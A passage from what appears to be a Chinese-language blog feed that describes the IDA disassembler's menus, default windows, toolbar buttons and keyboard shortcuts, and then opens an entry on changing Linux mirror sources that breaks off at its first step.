<h2 id="Debugger"><a href="#Debugger" class="headerlink" title="Debugger"></a>Debugger</h2><p>动态调试不做介绍；</p>
<h2 id="options"><a href="#options" class="headerlink" title="options"></a>options</h2><p>功能：</p>
<ul>
<li><p>  <code>General</code>：打开常规设置，包括反汇编、分析、交叉引用、字符串、图形视图等；</p>
</li>
<li><p>  <code>Colors</code>：颜色设置；</p>
</li>
<li><p>  <code>Font</code>：字体设置；</p>
</li>
<li><p>  <code>Shortcuts</code>：快捷键设置；</p>
</li>
<li><p>  <code>Show command palette</code>：展示命令面板，快捷键：<code>ctrl+shift+P</code>；</p>
</li>
<li><p>  <code>Repeat last palette command</code>：<code>重复上一个面板的命令</code>，快捷键：<code>ctrl+shift+R</code>；</p>
</li>
<li><p>  <code>Assembler directives</code>：设置汇编程序指令；</p>
</li>
<li><p>  <code>Name representation</code>：设置名称表示；</p>
</li>
<li><p>  <code>Demangled names</code>：设置不符合标准的名称；</p>
</li>
<li><p>  <code>Compiler</code>：设置编译器；</p>
</li>
<li><p>  <code>String literals</code>：设置字符串编码，快捷键：<code>opt+A</code>；</p>
</li>
<li><p>  <code>Setup data type</code>设置数据类型，快捷键：<code>opt+D</code>；</p>
</li>
<li><p><code>Source paths</code>：设置源路径；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126164911.png" style="zoom:50%;"></li>
</ul>
<h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>功能</p>
<ul>
<li><p>  <code>Load desktop</code>：迅速打开之前保存的桌面布局；</p>
</li>
<li><p>  <code>Save desktop</code>：保存当前的桌面布局；</p>
</li>
<li><p>  <code>Delete desktop</code>：删除之前保存的桌面布局；</p>
</li>
<li><p>  <code>Reset desktop</code>：重置当前桌面布局；</p>
</li>
<li><p>  <code>Reset hidden messages</code>：通过选中“不再显示此消息”复选框来重置用户隐藏的所有问题和消息的状态；</p>
</li>
<li><p>  <code>Windows list</code>：列出当前打开的所有窗口，可以通过快捷键：<code>opt+数字</code> 进行选择切换；</p>
</li>
<li><p>  <code>Next window</code>：显示下一个打开的窗口，快捷键：<code>F6</code>；</p>
</li>
<li><p>  <code>Previous window</code>：显示上一个打开的窗口，快捷键：<code>shift+F6</code>；</p>
</li>
<li><p>  <code>Close window</code>：关闭当前打开的窗口，快捷键：<code>opt+F3</code>；</p>
</li>
<li><p><code>Foucs command line</code>：将光标放置在Output window中的命令行输入上，快捷键：<code>opt+.</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126100425.png" style="zoom:25%;"></li>
</ul>
<h1 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h1><p>IDA默认会显示8个窗口，分别为函数窗口、反汇编窗口、十六进制窗口、结构体窗口、枚举窗口、导入窗口、导出窗口、输出窗口；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210118171441.png" style="zoom:25%;">

<h2 id="函数窗口"><a href="#函数窗口" class="headerlink" title="函数窗口"></a>函数窗口</h2><p>Functions window，用于列举IDA在数据库中识别的每一个函数，包括函数名、所在的段、起始地址、长度等；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124125831.png" style="zoom:25%;">

<p>函数过滤器：<code>右键→Modify filters</code>/<code>ctrl+shift+F</code>，在弹出的筛选框中，输入信息如<code>main</code>，点击添加按钮<code>Add</code>，添加一条任何一列为main的函数信息筛选项；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124130532.png" style="zoom:25%;">

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124130635.png" style="zoom:25%;">

<h2 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h2><p>IDA View，反汇编窗口是IDA的最主要数据窗口，可以显示IDA对目标程序的反汇编结果，同时提供文本视图和图形视图，针对不能识别的代码段和数据段，会显示数据字节内容，并使用不同的颜色进行标注。</p>
<p>反汇编窗口有两种形式：分别是<strong>图形视图</strong>（默认）和<strong>文本视图</strong>；</p>
<ul>
<li><p>在图形视图中，IDA以程序流程图的形式显示代码，将函数分解成许多基本块，从而生动显示该函数由一个块到另一个块的控制流程；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210118173122.png" style="zoom:20%;"></li>
<li><p>文本视图呈现程序的完整反汇编代码清单，只有通过文本视图才能查看一个二进制文件的数据部分；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210118175956.png" style="zoom:25%;"></li>
<li><p>  选择<code>View→Open subviews→Disassembly</code>选项，打开反汇编子窗口，就可以用多个子窗口来分析同一段程序，而不必来回翻页査看代码了。其他常用窗口，例如 “Functions” 和 “Proximity browser”，也可以使用这个菜单打开。</p>
</li>
<li><p>切换方式</p>
<ul>
<li><p><code>右键→Graph view</code>/<code>右键→Text view</code>;</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210118172927.png" style="zoom:25%;">

  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/image-20210118180516425.png" style="zoom:25%;"></li>
<li><p>  快捷键：<code>Space</code>；</p>
</li>
<li><p>  <code>ctrl键+鼠标滚轮</code>调整图形的大小；</p>
</li>
<li><p>图形视图下<code>右键→Proximity browser</code>，可以切换到函数级别的窗体结构信息，查看邻近函数；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210123195753.png" style="zoom:15%;">

  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210123200149.png" style="zoom:15%;"></li>
</ul>
</li>
</ul>
<h2 id="十六进制窗口"><a href="#十六进制窗口" class="headerlink" title="十六进制窗口"></a>十六进制窗口</h2><p>Hex View，用于显示程序内容和对应地址空间的十六进制数据，也可以便捷地进行代码和数据修改；</p>
<ul>
<li>  如果十六进制窗体中某些数据显示为问号，则表示IDA无法给出对应虚拟地址范围内的数值；</li>
<li>  在十六进制窗口选中某地址数据，再切换回反汇编窗口时，可以看到对应地址的反汇编信息；</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124112927.png" style="zoom:25%;">

<p>十六进制编辑：<code>右键→Edit</code>；</p>
<p>快捷键：<code>F2</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124113103.png" style="zoom:25%;">

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124113225.png" style="zoom:25%;">



<h2 id="结构体窗口"><a href="#结构体窗口" class="headerlink" title="结构体窗口"></a>结构体窗口</h2><p>Structures，用于显示IDA决定在被分析的二进制文件中使用的任何复杂的数据结构Struct、Union等；</p>
<p>窗口前4行介绍了窗口可以进行的操作：</p>
<ul>
<li>  <code>Ins/Del</code>：创建/删除结构体；</li>
<li>  <code>D/A/*</code>：创建结构体成员类型（数据/ASCII/数组）；</li>
<li>  <code>N</code>：重命名结构体或结构体成员；</li>
<li>  <code>U</code>：删除结构体成员；</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124114707.png" style="zoom:25%;">

<p>展开结构体：<code>右键→Unhide</code>/<code>双击</code>查看详细布局；</p>
<p>关闭结构体：<code>右键→Hide</code>/<code>双击</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124121245.png" style="zoom:25%;">

<p>添加结构体：<code>i</code></p>
<p>导入标准结构体<code>Add standard struct</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124122347.png" style="zoom:25%;">

<h2 id="枚举窗口"><a href="#枚举窗口" class="headerlink" title="枚举窗口"></a>枚举窗口</h2><p>Enums，类似结构体窗口，显示检测到的标准枚举类型；</p>
<p>窗口前3行介绍了窗口可以进行的操作：</p>
<ul>
<li>  <code>Ins/Del/ctrl+E</code>：创建/删除/编辑枚举类型；</li>
<li>  <code>N/ctrl+N</code>：创建/编辑符号常数；</li>
<li>  <code>;/:</code>：为当前项目做注释；</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124122543.png"></p>
<p>展开枚举详情：<code>右键→Unhide</code>/<code>双击</code>；</p>
<p>关闭枚举详情：<code>右键→Hide</code>/<code>双击</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124123426.png" style="zoom:25%;">

<h2 id="导入窗口"><a href="#导入窗口" class="headerlink" title="导入窗口"></a>导入窗口</h2><p>Imports，列举程序的导入函数列表，列出了可执行文件调用的所有函数包括函数名称、包含该函数的库的名称、相关函数的虚拟地址；</p>
<p><code>双击</code>函数，将跳转到反汇编窗口的函数地址处；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124124318.png" style="zoom:25%;">

<p>备注：针对静态链接的程序，不存在外部依赖关系，只有在改程序使用共享库时，才会用到本窗口；</p>
<h2 id="导出窗口"><a href="#导出窗口" class="headerlink" title="导出窗口"></a>导出窗口</h2><p>Exports，列举程序的执行入口点以及任何由文件导出给其他文件使用的函数和变量，包括名称、对应的虚拟地址；</p>
<p><code>双击</code>，将跳转到反汇编窗口的对应地址处；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124124948.png" style="zoom:25%;">

<h2 id="输出窗口"><a href="#输出窗口" class="headerlink" title="输出窗口"></a>输出窗口</h2><p>Output window，主要用于反馈文件分析进度、状态消息、错误消息等，同时还可以运行python和IDC；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210123222853.png" style="zoom:25%;">

<h2 id="字符串窗口"><a href="#字符串窗口" class="headerlink" title="字符串窗口"></a>字符串窗口</h2><p>Strings window，显示的从二进制文件中提取的一组组字符串，双击窗口中的字符串，反汇编窗口将跳转到该字符串所在的地址处，将字符串窗口与交叉引用结合使用，可以快速定位程序中任何引用该字符串的位置；</p>
<p>打开方式：<code>View→Open Subviews→Strings</code>；</p>
<p>快捷键：<code>shift+F12</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210123223825.png" style="zoom:25%;">

<p>在字符串窗口<code>右键→Setup</code>，可以设置扫描的字符串类型；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210123224015.png" style="zoom:33%;">

<h2 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h2><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126215758.png"></p>
<table>
<thead>
<tr>
<th>标号</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>加载新的文件或数据</td>
</tr>
<tr>
<td>2</td>
<td>保存当前项目</td>
</tr>
<tr>
<td>3</td>
<td>后退到上次保存位置</td>
</tr>
<tr>
<td>4</td>
<td>前进到下一个保存位置</td>
</tr>
<tr>
<td>5</td>
<td>搜索立即数</td>
</tr>
<tr>
<td>6</td>
<td>搜索字符字符串</td>
</tr>
<tr>
<td>7</td>
<td>搜索字节序列</td>
</tr>
<tr>
<td>8</td>
<td>搜索下一个项目</td>
</tr>
<tr>
<td>9</td>
<td>切换向上/向下搜索</td>
</tr>
<tr>
<td>10</td>
<td>锁定高亮</td>
</tr>
<tr>
<td>11</td>
<td>打开问题窗口</td>
</tr>
<tr>
<td>12</td>
<td>切换是否允许分析</td>
</tr>
<tr>
<td>13</td>
<td>打开反编译窗口</td>
</tr>
<tr>
<td>14</td>
<td>打开十六进制窗口</td>
</tr>
<tr>
<td>15</td>
<td>打开调试窗口</td>
</tr>
<tr>
<td>16</td>
<td>切换到文本反编译窗口</td>
</tr>
<tr>
<td>17</td>
<td>切换到图形反编译窗口</td>
</tr>
<tr>
<td>18</td>
<td>切换到函数级别的窗体结构信息</td>
</tr>
<tr>
<td>19</td>
<td>设置图形不放大</td>
</tr>
<tr>
<td>20</td>
<td>设置合适的图形大小</td>
</tr>
<tr>
<td>21</td>
<td>显示图形布局</td>
</tr>
<tr>
<td>22</td>
<td>打印图形</td>
</tr>
<tr>
<td>23</td>
<td>设置图形选项</td>
</tr>
<tr>
<td>24</td>
<td>设置图形颜色</td>
</tr>
<tr>
<td>25</td>
<td>打开签名窗口</td>
</tr>
<tr>
<td>26</td>
<td>打开类窗口</td>
</tr>
<tr>
<td>27</td>
<td>打开结构体窗口</td>
</tr>
<tr>
<td>28</td>
<td>打开枚举窗口</td>
</tr>
<tr>
<td>29</td>
<td>打开交叉引用窗口</td>
</tr>
<tr>
<td>30</td>
<td>打开函数调用窗口</td>
</tr>
<tr>
<td>31</td>
<td>显示段窗口</td>
</tr>
<tr>
<td>32</td>
<td>显示段寄存器窗口</td>
</tr>
<tr>
<td>33</td>
<td>显示选择器窗口</td>
</tr>
<tr>
<td>34</td>
<td>打开计算器</td>
</tr>
<tr>
<td>35</td>
<td>打开记事本对数据库做注释</td>
</tr>
<tr>
<td>36</td>
<td>执行脚本命令</td>
</tr>
<tr>
<td>37</td>
<td>执行脚本文件</td>
</tr>
<tr>
<td>38</td>
<td>绘制当前函数流程图</td>
</tr>
<tr>
<td>39</td>
<td>绘制函数调用流程图</td>
</tr>
<tr>
<td>40</td>
<td>绘制<strong>到</strong>程序的当前地址/选定地址范围的参照图</td>
</tr>
<tr>
<td>41</td>
<td>绘制<strong>来自</strong>程序的当前地址/选定地址范围的参照图</td>
</tr>
<tr>
<td>42</td>
<td>绘制<strong>来自/至</strong>程序的当前地址/选定地址范围的用户自定义的外部参照图</td>
</tr>
<tr>
<td>43</td>
<td>转换为指令</td>
</tr>
<tr>
<td>44</td>
<td>转换为数据</td>
</tr>
<tr>
<td>45</td>
<td>声明结构体变量</td>
</tr>
<tr>
<td>46</td>
<td>转换为字符串</td>
</tr>
<tr>
<td>47</td>
<td>转换为数组</td>
</tr>
<tr>
<td>48</td>
<td>重命名当前位置</td>
</tr>
<tr>
<td>49</td>
<td>转换为未定义类型</td>
</tr>
<tr>
<td>50</td>
<td>显示导入窗口</td>
</tr>
<tr>
<td>51</td>
<td>显示导出窗口</td>
</tr>
<tr>
<td>52</td>
<td>显示名称窗口</td>
</tr>
<tr>
<td>53</td>
<td>显示函数窗口</td>
</tr>
<tr>
<td>54</td>
<td>显示字符串窗口</td>
</tr>
<tr>
<td>55</td>
<td>数据段操作数偏移</td>
</tr>
<tr>
<td>56</td>
<td>操作数转换为数字</td>
</tr>
<tr>
<td>57</td>
<td>操作数转换为字符串</td>
</tr>
<tr>
<td>58</td>
<td>操作数转换为段基</td>
</tr>
<tr>
<td>59</td>
<td>操作数转换为符号常量</td>
</tr>
<tr>
<td>60</td>
<td>操作数转换为堆栈变量的偏移量</td>
</tr>
<tr>
<td>61</td>
<td>更改当前操作数的符号</td>
</tr>
<tr>
<td>62</td>
<td>对当前操作数执行位求反</td>
</tr>
<tr>
<td>63</td>
<td>手动输入当前操作数</td>
</tr>
<tr>
<td>64</td>
<td>创建新函数或编辑函数属性</td>
</tr>
<tr>
<td>65</td>
<td>打开当前函数的堆栈变量窗口</td>
</tr>
<tr>
<td>66</td>
<td>指定当前函数的命名</td>
</tr>
<tr>
<td>67</td>
<td>定义新的枚举类型</td>
</tr>
<tr>
<td>68</td>
<td>编辑选中的枚举类型</td>
</tr>
<tr>
<td>69</td>
<td>删除选中的枚举类型</td>
</tr>
<tr>
<td>70</td>
<td>为枚举类型添加符号常量</td>
</tr>
<tr>
<td>71</td>
<td>编辑符号常量</td>
</tr>
<tr>
<td>72</td>
<td>删除符号常量</td>
</tr>
<tr>
<td>73</td>
<td>声明新的结构体/枚举类型</td>
</tr>
<tr>
<td>74</td>
<td>复制选中的结构体/枚举类型</td>
</tr>
<tr>
<td>75</td>
<td>编辑结构体类型</td>
</tr>
<tr>
<td>76</td>
<td>删除结构体/枚举类型</td>
</tr>
<tr>
<td>77</td>
<td>向结构体中插入未定义的字符序列</td>
</tr>
<tr>
<td>78</td>
<td>从结构体中删除未定义的字符串</td>
</tr>
<tr>
<td>79</td>
<td>创建常规注释</td>
</tr>
<tr>
<td>80</td>
<td>创建交互注释</td>
</tr>
<tr>
<td>81</td>
<td>创建行前注释</td>
</tr>
<tr>
<td>82</td>
<td>创建行后注释</td>
</tr>
</tbody></table>
<h2 id="分布导航"><a href="#分布导航" class="headerlink" title="分布导航"></a>分布导航</h2><p>显示被加载文件地址空间线性视图，不同位置代表功能如下，可根据需要快速跳转到相关代码处；</p>
<ul>
<li>  <code>Library function</code>：库函数</li>
<li>  <code>Regular function</code>：规则函数</li>
<li>  <code>Instruction</code>：指令</li>
<li>  <code>Data</code>：数据</li>
<li>  <code>Unexplored</code>：未查询区域</li>
<li>  <code>External symbol</code>：外部符号</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210123220406.png" style="zoom:25%;">

<p>通过<code>右键→zoom</code>调节线性图的显示比例；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126224840.png" style="zoom:25%;">

<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="IDA常用快捷键"><a href="#IDA常用快捷键" class="headerlink" title="IDA常用快捷键"></a>IDA常用快捷键</h2><table>
<thead>
<tr>
<th align="center">快捷键</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>B</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为二进制数</td>
</tr>
<tr>
<td align="center"><code>C</code></td>
<td align="center">数据解析成代码</td>
</tr>
<tr>
<td align="center"><code>D</code></td>
<td align="center">代码解析成数据</td>
</tr>
<tr>
<td align="center"><code>G</code></td>
<td align="center">跳转到指定地址查看</td>
</tr>
<tr>
<td align="center"><code>H</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为十进制数</td>
</tr>
<tr>
<td align="center"><code>Q</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为十六进制数</td>
</tr>
<tr>
<td align="center"><code>R</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为字符</td>
</tr>
<tr>
<td align="center"><code>X</code></td>
<td align="center">查看函数的交叉引用</td>
</tr>
<tr>
<td align="center"><code>Space</code></td>
<td align="center">列表视图与图形视图切换</td>
</tr>
<tr>
<td align="center"><code>Tab</code></td>
<td align="center">在反汇编视图和伪代码视图之间切换</td>
</tr>
<tr>
<td align="center"><code>Esc</code></td>
<td align="center">跳转到返回前的地址</td>
</tr>
<tr>
<td align="center"><code>F5</code></td>
<td align="center">生成反汇编窗口中的函数对应的伪代码</td>
</tr>
<tr>
<td align="center"><code>ctrl+shift+W</code></td>
<td align="center">拍摄快照</td>
</tr>
<tr>
<td align="center"><code>shift+F12</code></td>
<td align="center">打开字符串窗口</td>
</tr>
<tr>
<td align="center"><code>ctrl+B</code></td>
<td align="center">查找下一个字节序列</td>
</tr>
<tr>
<td align="center"><code>opt+T</code></td>
<td align="center">搜索字符串</td>
</tr>
</tbody></table>
<h2 id="IDA快捷键总结"><a href="#IDA快捷键总结" class="headerlink" title="IDA快捷键总结"></a>IDA快捷键总结</h2><table>
<thead>
<tr>
<th align="center">快捷键</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>B</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为二进制数</td>
</tr>
<tr>
<td align="center"><code>C</code></td>
<td align="center">数据解析成代码</td>
</tr>
<tr>
<td align="center"><code>D</code></td>
<td align="center">代码解析成数据</td>
</tr>
<tr>
<td align="center"><code>G</code></td>
<td align="center">跳转到指定地址查看</td>
</tr>
<tr>
<td align="center"><code>H</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为十进制数</td>
</tr>
<tr>
<td align="center"><code>K</code></td>
<td align="center">将当前指令的立即操作数类型转换为堆栈变量的偏移量</td>
</tr>
<tr>
<td align="center"><code>L</code></td>
<td align="center">创建对齐指令,替换链接器插入的许多无用字节，用于将代码和数据对齐到段落边界或等于2的幂的任何其他地址</td>
</tr>
<tr>
<td align="center"><code>M</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为枚举成员</td>
</tr>
<tr>
<td align="center"><code>N</code></td>
<td align="center">重命名</td>
</tr>
<tr>
<td align="center"><code>O</code></td>
<td align="center">将当前指令/数据的立即数转换为当前数据段（DS）的偏移量</td>
</tr>
<tr>
<td align="center"><code>Q</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为十六进制数</td>
</tr>
<tr>
<td align="center"><code>R</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为字符</td>
</tr>
<tr>
<td align="center"><code>S</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为段基</td>
</tr>
<tr>
<td align="center"><code>T</code></td>
<td align="center">将范围选择中的所有指令立即数转换为通过结构及其可能的子联合的偏移路径</td>
</tr>
<tr>
<td align="center"><code>V</code></td>
<td align="center">将常规寄存器重命名为一些有意义的名称</td>
</tr>
<tr>
<td align="center"><code>X</code></td>
<td align="center">查看函数的交叉引用</td>
</tr>
<tr>
<td align="center"><code>Y</code></td>
<td align="center">指定当前函数的命名</td>
</tr>
<tr>
<td align="center"><code>Space</code></td>
<td align="center">列表视图与图形视图切换</td>
</tr>
<tr>
<td align="center"><code>Tab</code></td>
<td align="center">在反汇编视图和伪代码视图之间切换</td>
</tr>
<tr>
<td align="center"><code>Esc</code></td>
<td align="center">跳转到返回前的地址</td>
</tr>
<tr>
<td align="center"><code>F5</code></td>
<td align="center">生成反汇编窗口中的函数对应的伪代码</td>
</tr>
<tr>
<td align="center"><code>F6</code></td>
<td align="center">显示下一个打开的窗口</td>
</tr>
<tr>
<td align="center"><code>ctrl+A</code></td>
<td align="center">查找下一个定义的字节序列</td>
</tr>
<tr>
<td align="center"><code>ctrl+B</code></td>
<td align="center">查找下一个字节序列</td>
</tr>
<tr>
<td align="center"><code>ctrl+D</code></td>
<td align="center">查找下一条数据</td>
</tr>
<tr>
<td align="center"><code>ctrl+E</code></td>
<td align="center">显示入口点列表</td>
</tr>
<tr>
<td align="center"><code>ctrl+F</code></td>
<td align="center">搜索错误操作数</td>
</tr>
<tr>
<td align="center"><code>ctrl+G</code></td>
<td align="center">跳转到指定寄存器</td>
</tr>
<tr>
<td align="center"><code>ctrl+I</code></td>
<td align="center">查找下一个立即数</td>
</tr>
<tr>
<td align="center"><code>ctrl+J</code></td>
<td align="center">列出到光标位置的交叉引用</td>
</tr>
<tr>
<td align="center"><code>ctrl+K</code></td>
<td align="center">打开当前函数的堆栈变量窗口</td>
</tr>
<tr>
<td align="center"><code>ctrl+L</code></td>
<td align="center">跳转到指定命名位置处</td>
</tr>
<tr>
<td align="center"><code>ctrl+M</code></td>
<td align="center">选择一个标签并跳转</td>
</tr>
<tr>
<td align="center"><code>ctrl+O</code></td>
<td align="center">将当前指令/数据的立即数转换为当前段（CS）的偏移量</td>
</tr>
<tr>
<td align="center"><code>ctrl+P</code></td>
<td align="center">跳转到选定的函数处</td>
</tr>
<tr>
<td align="center"><code>ctrl+Q</code></td>
<td align="center">跳转到有问题的位置</td>
</tr>
<tr>
<td align="center"><code>ctrl+R</code></td>
<td align="center">将当前指令/数据的立即数操作数转换为复数偏移量表达式</td>
</tr>
<tr>
<td align="center"><code>ctrl+S</code></td>
<td align="center">跳转到指定段的段头</td>
</tr>
<tr>
<td align="center"><code>ctrl+T</code></td>
<td align="center">查找下一个字符串</td>
</tr>
<tr>
<td align="center"><code>ctrl+U</code></td>
<td align="center">查找下一个未定义字节序列</td>
</tr>
<tr>
<td align="center"><code>ctrl+V</code></td>
<td align="center">搜索下一个无效的位置</td>
</tr>
<tr>
<td align="center"><code>ctrl+W</code></td>
<td align="center">保存</td>
</tr>
<tr>
<td align="center"><code>ctrl+X</code></td>
<td align="center">列出光标位置到达的交叉引用</td>
</tr>
<tr>
<td align="center"><code>ctrl+Z</code></td>
<td align="center">强制零偏移</td>
</tr>
<tr>
<td align="center"><code>ctrl+1</code></td>
<td align="center">查看窗口列表</td>
</tr>
<tr>
<td align="center"><code>ctrl+-</code></td>
<td align="center">隐藏反汇编代码</td>
</tr>
<tr>
<td align="center"><code>ctrl+;</code></td>
<td align="center">创建交叉注释</td>
</tr>
<tr>
<td align="center"><code>ctrl++</code></td>
<td align="center">显示隐藏的反汇编代码</td>
</tr>
<tr>
<td align="center"><code>ctrl+opt+P</code></td>
<td align="center">查看修改的字节</td>
</tr>
<tr>
<td align="center"><code>ctrl+shift+W</code></td>
<td align="center">拍摄快照</td>
</tr>
<tr>
<td align="center"><code>ctrl+F5</code></td>
<td align="center">创建C文件</td>
</tr>
<tr>
<td align="center"><code>ctrl+F9</code></td>
<td align="center">加载解析C头文件</td>
</tr>
<tr>
<td align="center"><code>ctrl+F12</code></td>
<td align="center">绘制程序中所有的函数调用流程图</td>
</tr>
<tr>
<td align="center"><code>opt+A</code></td>
<td align="center">设置字符串编码</td>
</tr>
<tr>
<td align="center"><code>opt+B</code></td>
<td align="center">搜索字节序列</td>
</tr>
<tr>
<td align="center"><code>opt+C</code></td>
<td align="center">查找下一条指令</td>
</tr>
<tr>
<td align="center"><code>opt+D</code></td>
<td align="center">设置数据类型</td>
</tr>
<tr>
<td align="center"><code>opt+G</code></td>
<td align="center">创建或更改段寄存器值</td>
</tr>
<tr>
<td align="center"><code>opt+I</code></td>
<td align="center">搜索立即数</td>
</tr>
<tr>
<td align="center"><code>opt+K</code></td>
<td align="center">指定当前指令如何修改堆栈指针（SP）</td>
</tr>
<tr>
<td align="center"><code>opt+L</code></td>
<td align="center">从光标处开始选择</td>
</tr>
<tr>
<td align="center"><code>opt+M</code></td>
<td align="center">添加标签</td>
</tr>
<tr>
<td align="center"><code>opt+P</code></td>
<td align="center">编辑函数</td>
</tr>
<tr>
<td align="center"><code>opt+Q</code></td>
<td align="center">声明新的结构体</td>
</tr>
<tr>
<td align="center"><code>opt+R</code></td>
<td align="center">将当前指令/数据的立即数转换为任何段的偏移量</td>
</tr>
<tr>
<td align="center"><code>opt+S</code></td>
<td align="center">更改除段基础以外的所有段属性</td>
</tr>
<tr>
<td align="center"><code>opt+T</code></td>
<td align="center">搜索字符串</td>
</tr>
<tr>
<td align="center"><code>opt+Y</code></td>
<td align="center">从当前光标位置显示对联合的引用</td>
</tr>
<tr>
<td align="center"><code>opt+.</code></td>
<td align="center">将光标放置在Output window中的命令行输入上</td>
</tr>
<tr>
<td align="center"><code>opt+F1</code></td>
<td align="center">自定义操作数</td>
</tr>
<tr>
<td align="center"><code>opt+F2</code></td>
<td align="center">指定程序中指令或数据的表示形式</td>
</tr>
<tr>
<td align="center"><code>opt+F3</code></td>
<td align="center">关闭当前打开的窗口</td>
</tr>
<tr>
<td align="center"><code>opt+F7</code></td>
<td align="center">加载用户自定义的IDC或IDA python脚本</td>
</tr>
<tr>
<td align="center"><code>opt+F9</code></td>
<td align="center">查看添加的脚本</td>
</tr>
<tr>
<td align="center"><code>opt+F10</code></td>
<td align="center">创建ASM文件</td>
</tr>
<tr>
<td align="center"><code>shift+E</code></td>
<td align="center">转换为结构体</td>
</tr>
<tr>
<td align="center"><code>shift+Fn+#</code></td>
<td align="center">将当前指令/数据的立即操作数类型转换为数字</td>
</tr>
<tr>
<td align="center"><code>shift+Fn+*</code></td>
<td align="center">转换为数组</td>
</tr>
<tr>
<td align="center"><code>shift+Fn+:</code></td>
<td align="center">创建常规注释</td>
</tr>
<tr>
<td align="center"><code>shift+Fn+?</code></td>
<td align="center">打开简单计算器</td>
</tr>
<tr>
<td align="center"><code>shift+Fn+~</code></td>
<td align="center">将当前操作数按位取反</td>
</tr>
<tr>
<td align="center"><code>shift+F2</code></td>
<td align="center">输入并执行以内置IDC语言或任何其他注册的extlang编写的脚本</td>
</tr>
<tr>
<td align="center"><code>shift+F4</code></td>
<td align="center">打开名称窗口,显示函数和参数的命名列表</td>
</tr>
<tr>
<td align="center"><code>shift+F5</code></td>
<td align="center">打开签名窗口</td>
</tr>
<tr>
<td align="center"><code>shift+F6</code></td>
<td align="center">显示上一个打开的窗口</td>
</tr>
<tr>
<td align="center"><code>shift+F7</code></td>
<td align="center">打开段窗口，显示所有段列表</td>
</tr>
<tr>
<td align="center"><code>shift+F8</code></td>
<td align="center">打开寄存器窗口，显示所有段的寄存器信息</td>
</tr>
<tr>
<td align="center"><code>shift+F9</code></td>
<td align="center">打开结构体窗口</td>
</tr>
<tr>
<td align="center"><code>shift+F10</code></td>
<td align="center">打开枚举窗口</td>
</tr>
<tr>
<td align="center"><code>shift+F11</code></td>
<td align="center">打开类库窗口</td>
</tr>
<tr>
<td align="center"><code>shift+F12</code></td>
<td align="center">打开字符串窗口</td>
</tr>
<tr>
<td align="center"><code>shift+cmd+F</code></td>
<td align="center">切换独立窗口显示</td>
</tr>
</tbody></table>
<p>参考：<a href="https://www.hex-rays.com/products/ida/support/idadoc/index.shtml">https://www.hex-rays.com/products/ida/support/idadoc/index.shtml</a></p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux更新镜像源</title>
    <url>/Linux%E6%9B%B4%E6%8D%A2%E6%BA%90.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>整理了常见Linux系统更换镜像源步骤；<span id="more"></span></p>
<h1 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h1><ol>
<li><p>命令行打开<code>sources.list</code>文件</p>
